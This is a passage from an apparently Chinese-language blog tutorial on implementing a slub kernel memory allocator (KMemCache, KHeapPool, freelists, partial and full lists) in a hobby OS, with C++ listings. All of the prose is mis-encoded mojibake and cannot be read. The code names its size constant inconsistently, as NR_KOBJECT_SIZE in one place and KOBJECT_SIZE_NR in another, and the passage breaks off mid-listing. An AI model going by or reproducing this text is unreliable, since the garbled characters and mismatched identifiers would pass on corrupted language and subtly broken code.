è¿›è¡Œåˆ†é…ï¼Œå¯¹äºéå¯¹é½çš„å†…å­˜åˆ†é…å¤§å°åˆ™å‘ä¸Šå¯¹é½åˆ°ç›¸åº”çš„å†…å­˜æ± è¿›è¡Œåˆ†é…</li><li>ä¸åŒçš„å†…å­˜æ± ç‹¬ç«‹æŒæœ‰ä¸€ç»„é¡µé¢ï¼Œåœ¨éœ€è¦æ—¶è‡ªè¡Œå‘ buddy system è¿›è¡Œå†…å­˜åˆ†é…è¯·æ±‚</li><li>å†…å­˜æ± å‘ buddy system å•æ¬¡è¯·æ±‚å¾—åˆ°çš„ä¸€ä»½è¿ç»­å†…å­˜é¡µç§°ä¸º <code>slub</code> ï¼Œä¸€å¼  <code>slub</code> ä¼šè¢«åˆ†å‰²ä¸ºå¤šä¸ªç›¸åŒå¤§å°çš„å°å†…å­˜å¯¹è±¡ï¼Œç©ºé—²å†…å­˜å¯¹è±¡é—´è¿æ¥æˆå•å‘é“¾è¡¨ç»“æ„</li></ul><p>slub allocator çš„å¥½å¤„åœ¨äº <strong>æˆ‘ä»¬å¹¶ä¸éœ€è¦é¢å¤–çš„æ•°æ®å­—æ®µå»è®°å½•æ¯ä¸ªå†…å­˜å¯¹è±¡çš„çŠ¶æ€ä¿¡æ¯</strong> ï¼Œæˆ‘ä»¬ä½¿ç”¨ direct mapping area çš„åœ°å€æ¥åˆ†å‰² slub pagesï¼Œç”±æ­¤å¾ˆå®¹æ˜“èƒ½æ ¹æ®å†…å­˜å¯¹è±¡çš„åœ°å€è·å–åˆ°å…¶æ‰€å±çš„é¡µé¢ä¸å¯¹åº”çš„ <code>page</code> ç»“æ„ä½“ï¼ŒåŒæ—¶ä½¿ç”¨é“¾è¡¨ç»„ç»‡ç©ºé—²å¯¹è±¡å¯ä»¥è®©æˆ‘ä»¬å¾ˆæ–¹ä¾¿åœ°å¾—çŸ¥å½“å‰ slub pages çš„çŠ¶æ€</p><p>æˆ‘ä»¬ä½¿ç”¨ <code>page</code> ç»“æ„ä½“ä¸­çš„ä¸€ä¸ªå­—æ®µè®°å½•å…¶å¯¹åº”çš„ slub pages çš„ç©ºé—²å¯¹è±¡é“¾è¡¨ï¼ŒåŸºæœ¬ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2024/06/30/p1Ho9Vv5AWiNlXD.png"></p><blockquote><p>ä¸ºä»€ä¹ˆä½¿ç”¨äºŒé˜¶æŒ‡é’ˆï¼Ÿä¸»è¦æ˜¯å› ä¸ºç¬”è€…ä¸ªäººæ¯”è¾ƒå–œæ¬¢çš„ä¸€ç§é“¾è¡¨è¿­ä»£å†™æ³•ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">page-&gt;freelist = *page-&gt;freelist;<br></code></pre></td></tr></table></figure></blockquote><p>ç„¶åæ˜¯å†…å­˜æ± ç»“æ„çš„è®¾è®¡ï¼Œæˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ª <code>class KMemCache</code> ç»“æ„å®šä¹‰ä¸€ä¸ªæŒ‡å®šå¤§å°çš„å†…å­˜æ± ï¼Œå¹¶ä¸ºæ¯ä¸ªå†…å­˜æ± è®¾è®¡ä¸¤ä¸ªé“¾è¡¨ï¼š</p><ul><li><code>full</code> ï¼šè¿™ä¸ªé“¾è¡¨ä¸Šçš„ slub pages æ²¡æœ‰ç©ºé—²å¯¹è±¡</li><li><code>partial</code> è¿™ä¸ªé“¾è¡¨ä¸Šçš„ slub pages æœ‰ä¸€å®šçš„ç©ºé—²å¯¹è±¡</li></ul><p>æ­¤å¤–ï¼Œæˆ‘ä»¬åœ¨ <code>KMemCache</code> ä¸­è®°å½•å…¶æ‰€éœ€çš„ slub pages ä¸Šçš„å¯¹è±¡æ•°é‡ç­‰ä¿¡æ¯</p><blockquote><p>æ³¨ï¼šæœ¬ç« æˆ‘ä»¬æš‚æ—¶ä¸è€ƒè™‘é’ˆå¯¹å¤šæ ¸çš„ä¼˜åŒ–ç­–ç•¥ï¼ˆå¦‚ cpu ç‹¬å çš„ <code>KMemCacheCPU</code> ï¼‰ï¼Œç­‰åˆ°åæœŸå¦‚æœç¬”è€…è¿˜æœ‰ç²¾åŠ›å†è¡Œä¼˜åŒ–ï¼šï¼‰</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/* size-specific memory pool, front end of PagePool */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">KMemCache</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">KMemCache</span>(<span class="hljs-type">void</span>);<br>    ~<span class="hljs-built_in">KMemCache</span>();<br><br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">Malloc</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">void</span>*</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">Free</span><span class="hljs-params">(Page *page, <span class="hljs-type">void</span> *obj)</span> -&gt; <span class="hljs-type">void</span></span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">AddPool</span><span class="hljs-params">(PagePool *pool)</span> -&gt; <span class="hljs-type">bool</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">RemovePool</span><span class="hljs-params">(base::<span class="hljs-type">size_t</span> index)</span> -&gt; PagePool*</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">Init</span><span class="hljs-params">(base::<span class="hljs-type">size_t</span> obj_sz)</span> -&gt; <span class="hljs-type">void</span></span>;<br><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-comment">/* pages pool backend */</span><br><br>    PagePool *pools[CACHE_POOL_MAX_NR];<br>    base::<span class="hljs-type">size_t</span> pool_nr;<br>    base::<span class="hljs-type">size_t</span> order;<br><br>    <span class="hljs-keyword">auto</span> __internal_page_alloc(<span class="hljs-type">void</span>) -&gt; Page*;<br>    <span class="hljs-keyword">auto</span> __page_obj_slicing(Page* page) -&gt; <span class="hljs-type">void</span>;<br><br>    <span class="hljs-comment">/* caches front end */</span><br><br>    base::<span class="hljs-type">size_t</span> page_obj_nr;<br>    base::<span class="hljs-type">size_t</span> obj_sz;<br>    Page *current;<br>    lib::ListHead partial;<br>    lib::ListHead full;<br>    <span class="hljs-type">void</span> **freelist;<br><br>    <span class="hljs-keyword">auto</span> __internal_obj_alloc(<span class="hljs-type">void</span>) -&gt; <span class="hljs-type">void</span>*;<br>    <span class="hljs-keyword">auto</span> __internal_obj_free(Page *page, <span class="hljs-type">void</span> *obj) -&gt; <span class="hljs-type">void</span>;<br><br>    <span class="hljs-comment">/* infrastructure */</span><br><br>    lib::atomic::SpinLock lock;<br>&#125;;<br><br><br><span class="hljs-keyword">enum</span> &#123;<br>    KOBJECT_16 = <span class="hljs-number">0</span>,<br>    KOBJECT_32,<br>    KOBJECT_64,<br>    KOBJECT_128,<br>    KOBJECT_192,<br>    KOBJECT_256,<br>    KOBJECT_512,<br>    KOBJECT_1K,<br>    KOBJECT_2K,<br>    KOBJECT_4K,<br>    KOBJECT_8K, <span class="hljs-comment">/* max allocation for 2 pages */</span><br>    NR_KOBJECT_SIZE,<br>&#125;;<br><br><span class="hljs-comment">/* static memory initializer to avoid constructor to be existed */</span><br>base::<span class="hljs-type">uint8_t</span> GloblKMemCacheGroupMem[KOBJECT_SIZE_NR][<span class="hljs-built_in">sizeof</span>(KMemCache)];<br>KMemCache *GloblKMemCacheGroup[KOBJECT_SIZE_NR] = &#123;<br>    (KMemCache*) &amp;GloblKMemCacheGroupMem[KOBJECT_16],<br>    (KMemCache*) &amp;GloblKMemCacheGroupMem[KOBJECT_32],<br>    (KMemCache*) &amp;GloblKMemCacheGroupMem[KOBJECT_64],<br>    (KMemCache*) &amp;GloblKMemCacheGroupMem[KOBJECT_128],<br>    (KMemCache*) &amp;GloblKMemCacheGroupMem[KOBJECT_192],<br>    (KMemCache*) &amp;GloblKMemCacheGroupMem[KOBJECT_256],<br>    (KMemCache*) &amp;GloblKMemCacheGroupMem[KOBJECT_512],<br>    (KMemCache*) &amp;GloblKMemCacheGroupMem[KOBJECT_1K],<br>    (KMemCache*) &amp;GloblKMemCacheGroupMem[KOBJECT_2K],<br>    (KMemCache*) &amp;GloblKMemCacheGroupMem[KOBJECT_4K],<br>    (KMemCache*) &amp;GloblKMemCacheGroupMem[KOBJECT_8K],<br>&#125;;<br></code></pre></td></tr></table></figure><p>ç®€è€Œè¨€ä¹‹ï¼Œæˆ‘ä»¬çš„ <code>KMemCache</code> ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2024/10/08/uBOt6eP3zULygbW.png"></p><p>æˆ‘ä»¬åœ¨å†…å­˜ç®¡ç†æ¨¡å—åˆå§‹åŒ–æ—¶è¿›è¡Œå†…å­˜æ± çš„åˆå§‹åŒ–ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">KMemCache::Init</span><span class="hljs-params">(base::<span class="hljs-type">size_t</span> obj_sz)</span> -&gt; <span class="hljs-type">void</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> i = <span class="hljs-number">0</span>; i &lt; CACHE_POOL_MAX_NR; i++) &#123;<br>        <span class="hljs-keyword">this</span>-&gt;pools[i] = <span class="hljs-literal">nullptr</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">this</span>-&gt;pool_nr = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">this</span>-&gt;order = obj_sz &gt;&gt; PAGE_SHIFT;<br>    <span class="hljs-keyword">if</span> (obj_sz &gt;= PAGE_SIZE) &#123;<br>        <span class="hljs-keyword">this</span>-&gt;order++;<br>    &#125;<br><br>    <span class="hljs-keyword">this</span>-&gt;obj_sz = obj_sz;<br>    <span class="hljs-keyword">this</span>-&gt;page_obj_nr = (PAGE_SIZE &lt;&lt; <span class="hljs-keyword">this</span>-&gt;order) / <span class="hljs-keyword">this</span>-&gt;obj_sz;<br><br>    <span class="hljs-keyword">this</span>-&gt;current = <span class="hljs-literal">nullptr</span>;<br>    lib::<span class="hljs-built_in">list_head_init</span>(&amp;<span class="hljs-keyword">this</span>-&gt;partial);<br>    lib::<span class="hljs-built_in">list_head_init</span>(&amp;<span class="hljs-keyword">this</span>-&gt;full);<br>    <span class="hljs-keyword">this</span>-&gt;freelist = <span class="hljs-literal">nullptr</span>;<br><br>    <span class="hljs-keyword">this</span>-&gt;lock.<span class="hljs-built_in">Reset</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">auto</span> <span class="hljs-title">kheap_pool_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">void</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> i = <span class="hljs-number">0</span>; i &lt; KOBJECT_SIZE_NR; i++) &#123;<br>        GloblKMemCacheGroup[i]-&gt;<span class="hljs-built_in">Init</span>(kobj_default_size[i]);<br>        GloblKMemCacheGroup[i]-&gt;<span class="hljs-built_in">AddPool</span>(GloblPagePool);<br>    &#125;<br>    <br>    <span class="hljs-comment">/* ... */</span><br></code></pre></td></tr></table></figure><h2 id="å†…å­˜å¯¹è±¡åˆ†é…ç­–ç•¥"><a href="#å†…å­˜å¯¹è±¡åˆ†é…ç­–ç•¥" class="headerlink" title="å†…å­˜å¯¹è±¡åˆ†é…ç­–ç•¥"></a>å†…å­˜å¯¹è±¡åˆ†é…ç­–ç•¥</h2><p>é¦–å…ˆæ˜¯å†…å­˜å¯¹è±¡çš„åˆ†é…ï¼Œæˆ‘ä»¬æŒ‰ç…§å•æ¬¡è¯·æ±‚çš„å¤§å°å°†è¯·æ±‚åˆ†ä¸ºä¸¤ç±»ï¼š</p><ul><li>å¯¹äºå°äºå†…å­˜æ± ç»„æœ€å¤§å¤§å°çš„å†…å­˜è¯·æ±‚ï¼Œæˆ‘ä»¬å°†è¯·æ±‚å¤§å°å‘ä¸Šå¯¹é½åˆ°æœ€è¿‘çš„å†…å­˜æ± å¯¹è±¡å¤§å°ï¼Œä»ä¸­è¿›è¡Œåˆ†é…</li><li>å¯¹äºå¤§äºå†…å­˜æ± ç»„æœ€å¤§å¤§å°çš„å†…å­˜è¯·æ±‚ï¼Œæˆ‘ä»¬å°†å…¶å¯¹é½åˆ° <code>(2 ^ N) * PAGE_SIZE</code> å¤§å°ï¼Œä» buddy system è¿›è¡Œé¡µé¢åˆ†é…è¯·æ±‚</li><li>æˆ‘ä»¬ä½¿ç”¨ä» buddy system åˆ†é…çš„ä¸€ä»½é¡µé¢çš„é¦–ä¸ª <code>Page</code> ç»“æ„ä½“çš„ <code>Page::kc</code> å­—æ®µæ ‡è¯†å…¶æ˜¯å¦å±äºæŸä¸ª <code>KMemCache</code> ï¼Œä»è€ŒåŒºåˆ†è¿™ä¸¤ç±»å†…å­˜åˆ†é…</li></ul><p>åœ¨ <code>KMemCache</code> ä¸ <code>PagePool</code> ä¹‹ä¸Šï¼Œæˆ‘ä»¬å†åŒ…è£…ä¸€å±‚ <code>KHeapPool</code> ç»“æ„ä½“ä½œä¸ºå†…å­˜åˆ†é…çš„å‰ç«¯ï¼Œç”¨äºéšè—èƒŒåçš„åˆ†é…ç»†èŠ‚ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/* General front end of KMemCache */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">KHeapPool</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">KHeapPool</span>(<span class="hljs-type">void</span>);<br>    ~<span class="hljs-built_in">KHeapPool</span>();<br><br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">Malloc</span><span class="hljs-params">(base::<span class="hljs-type">size_t</span> size)</span> -&gt; <span class="hljs-type">void</span>*</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">Free</span><span class="hljs-params">(<span class="hljs-type">void</span> *obj)</span> -&gt; <span class="hljs-type">void</span></span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">PageAlloc</span><span class="hljs-params">(base::<span class="hljs-type">size_t</span> order)</span> -&gt; Page*</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">PageFree</span><span class="hljs-params">(Page *p)</span> -&gt; <span class="hljs-type">void</span></span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">Init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">void</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">SetKMemCaches</span><span class="hljs-params">(KMemCache **caches, base::<span class="hljs-type">size_t</span> cache_nr, base::<span class="hljs-type">size_t</span> *cache_obj_sizes)</span> -&gt; <span class="hljs-type">void</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">SetPagePools</span><span class="hljs-params">(PagePool **pools, base::<span class="hljs-type">size_t</span> pool_nr)</span> -&gt; <span class="hljs-type">void</span></span>;<br><br><span class="hljs-keyword">private</span>:<br>    KMemCache **caches;<br>    base::<span class="hljs-type">size_t</span> cache_nr;<br>    base::<span class="hljs-type">size_t</span> *cache_obj_sizes;<br><br>    <span class="hljs-keyword">auto</span> __malloc_caches(base::<span class="hljs-type">size_t</span> size) -&gt; <span class="hljs-type">void</span>*;<br><br>    PagePool **pools;<br>    base::<span class="hljs-type">size_t</span> pool_nr;<br><br>    <span class="hljs-keyword">auto</span> __malloc_pools(base::<span class="hljs-type">size_t</span> size) -&gt; <span class="hljs-type">void</span>*;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">KHeapPool::Malloc</span><span class="hljs-params">(base::<span class="hljs-type">size_t</span> size)</span> -&gt; <span class="hljs-type">void</span>*</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">void</span> *obj = <span class="hljs-literal">nullptr</span>;<br><br>    obj = <span class="hljs-keyword">this</span>-&gt;__malloc_caches(size);<br>    <span class="hljs-keyword">if</span> (!obj) &#123;<br>        obj = <span class="hljs-keyword">this</span>-&gt;__malloc_pools(size);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> obj;<br>&#125;<br><br><span class="hljs-keyword">auto</span> KHeapPool::__malloc_caches(base::<span class="hljs-type">size_t</span> size) -&gt; <span class="hljs-type">void</span>*<br>&#123;<br>    <span class="hljs-type">void</span> *obj = <span class="hljs-literal">nullptr</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">this</span>-&gt;cache_nr; i++) &#123;<br>        <span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-keyword">this</span>-&gt;cache_obj_sizes[i]) &#123;<br>            obj = <span class="hljs-keyword">this</span>-&gt;caches[i]-&gt;<span class="hljs-built_in">Malloc</span>();<br>            <span class="hljs-keyword">if</span> (obj) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> obj;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="I-å°å¯¹è±¡åˆ†é…ï¼šå½“å‰-slub-partial-list-PagePool"><a href="#I-å°å¯¹è±¡åˆ†é…ï¼šå½“å‰-slub-partial-list-PagePool" class="headerlink" title="I. å°å¯¹è±¡åˆ†é…ï¼šå½“å‰ slub -&gt; partial list -&gt; PagePool"></a>I. å°å¯¹è±¡åˆ†é…ï¼šå½“å‰ slub -&gt; partial list -&gt; PagePool</h3><p>å¯¹äºæ¯”è¾ƒå¸¸è§çš„å°å¯¹è±¡å†…å­˜åˆ†é…ï¼Œæˆ‘ä»¬çš„ç­–ç•¥å¦‚ä¸‹ï¼š</p><ul><li>é¦–å…ˆå‘ä¸Šå¯¹é½åˆ†é…å¤§å°ï¼Œæ£€æŸ¥å¯¹åº”å†…å­˜æ± çš„å½“å‰ freelist æ˜¯å¦ä»æœ‰å¯¹è±¡ï¼Œè‹¥æ˜¯åˆ™ç›´æ¥åˆ†é…å¹¶è¿”å›</li><li>è‹¥å¦ï¼Œæ£€æŸ¥å½“å‰æ˜¯å¦æœ‰ slub pageï¼Œè‹¥æ˜¯åˆ™å°†å…¶æŒ‚åˆ° full list</li><li>æ£€æŸ¥ partial list æ˜¯å¦ä»æœ‰ç©ºé—²å†…å­˜é¡µï¼Œè‹¥æ˜¯åˆ™å–ä¸‹å¹¶åˆ†é…ä¸ºå½“å‰ slub page å¹¶å›åˆ°ç¬¬ä¸€æ­¥é‡æ–°å¼€å§‹åˆ†é…</li><li>è‹¥ partial list ä¹Ÿä¸ºç©ºï¼Œå‘ PagePool è¯·æ±‚å†…å­˜é¡µï¼ŒæˆåŠŸåˆ™å›åˆ°ç¬¬ä¸€æ­¥é‡æ–°å¼€å§‹åˆ†é…ï¼Œå¤±è´¥åˆ™ç›´æ¥è¿”å› NULL</li></ul><p>éœ€è¦æ³¨æ„çš„æ˜¯åœ¨æˆ‘ä»¬çš„è®¾è®¡ä¸­å†…å­˜æ± åº”å½“åœ¨å¤šä¸ªæ ¸ä¹‹é—´è¿›è¡Œå…±äº«ï¼Œå› æ­¤æ‰€æœ‰æ“ä½œéœ€è¦å…¨ç¨‹åŠ é”</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> KMemCache::__internal_obj_alloc(<span class="hljs-type">void</span>) -&gt; <span class="hljs-type">void</span>*<br>&#123;<br>    <span class="hljs-type">void</span> *obj = <span class="hljs-literal">nullptr</span>;<br><br>redo:<br>    <span class="hljs-comment">/* we have objects on the kmem_cache now, just allocate one */</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>-&gt;freelist != <span class="hljs-literal">nullptr</span>) &#123;<br>        obj = <span class="hljs-keyword">this</span>-&gt;freelist;<br>        <span class="hljs-keyword">this</span>-&gt;freelist = (<span class="hljs-type">void</span>**) (*<span class="hljs-keyword">this</span>-&gt;freelist);<br>        <span class="hljs-keyword">this</span>-&gt;current-&gt;obj_nr--;<br>        <span class="hljs-keyword">goto</span> out;<br>    &#125;<br><br>    <span class="hljs-comment">/* no object on freelist, put the current page on the full list */</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>-&gt;current) &#123;<br>        lib::<span class="hljs-built_in">list_add_next</span>(&amp;<span class="hljs-keyword">this</span>-&gt;full, &amp;<span class="hljs-keyword">this</span>-&gt;current-&gt;list);<br>        <span class="hljs-keyword">this</span>-&gt;current = <span class="hljs-literal">nullptr</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* try to get the page from partial list */</span><br>    <span class="hljs-keyword">if</span> (!lib::<span class="hljs-built_in">list_empty</span>(&amp;<span class="hljs-keyword">this</span>-&gt;partial)) &#123;<br>        <span class="hljs-keyword">this</span>-&gt;current = lib::<span class="hljs-built_in">container_of</span>(<span class="hljs-keyword">this</span>-&gt;partial.next, &amp;Page::list);<br>        <span class="hljs-keyword">this</span>-&gt;freelist = <span class="hljs-keyword">this</span>-&gt;current-&gt;freelist;<br>        lib::<span class="hljs-built_in">list_del</span>(&amp;<span class="hljs-keyword">this</span>-&gt;current-&gt;list);<br>        <span class="hljs-keyword">goto</span> redo;<br>    &#125;<br><br>    <span class="hljs-comment">/* no current on the partial list, allocated from the buddy */</span><br>    <span class="hljs-keyword">this</span>-&gt;current = <span class="hljs-keyword">this</span>-&gt;__internal_page_alloc();<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>-&gt;current) &#123;<br>        <span class="hljs-keyword">this</span>-&gt;__page_obj_slicing(<span class="hljs-keyword">this</span>-&gt;current);<br>        <span class="hljs-keyword">this</span>-&gt;freelist = <span class="hljs-keyword">this</span>-&gt;current-&gt;freelist;<br>        <span class="hljs-keyword">goto</span> redo;<br>    &#125;<br><br>out:<br>    <span class="hljs-keyword">return</span> obj;<br>&#125;<br><br><span class="hljs-keyword">auto</span> KMemCache::__internal_page_alloc(<span class="hljs-type">void</span>) -&gt; Page*<br>&#123;<br>    Page *new_page = <span class="hljs-literal">nullptr</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> i = <span class="hljs-number">0</span>; i &lt; CACHE_POOL_MAX_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>-&gt;pools[i]) &#123;<br>            new_page = <span class="hljs-keyword">this</span>-&gt;pools[i]-&gt;<span class="hljs-built_in">AllocPages</span>(<span class="hljs-keyword">this</span>-&gt;order);<br>            <span class="hljs-keyword">if</span> (new_page) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> new_page;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">KMemCache::Malloc</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">void</span>*</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">void</span> *obj;<br><br>    <span class="hljs-keyword">this</span>-&gt;lock.<span class="hljs-built_in">Lock</span>();<br><br>    obj = <span class="hljs-keyword">this</span>-&gt;__internal_obj_alloc();<br><br>    <span class="hljs-keyword">this</span>-&gt;lock.<span class="hljs-built_in">UnLock</span>();<br><br>    <span class="hljs-keyword">return</span> obj;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨è¿›è¡Œæ–°çš„ slub pages åˆ†é…æ—¶ï¼Œæˆ‘ä»¬åº”å½“æ ¹æ®å½“å‰å†…å­˜æ± ä¿¡æ¯å°†å…¶åˆ†å‰²ä¸ºç›¸åº”æ•°é‡çš„ç©ºé—²å¯¹è±¡ï¼Œå¹¶å°†ç©ºé—²å¯¹è±¡é“¾æ¥ä¸ºå•å‘é“¾è¡¨ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 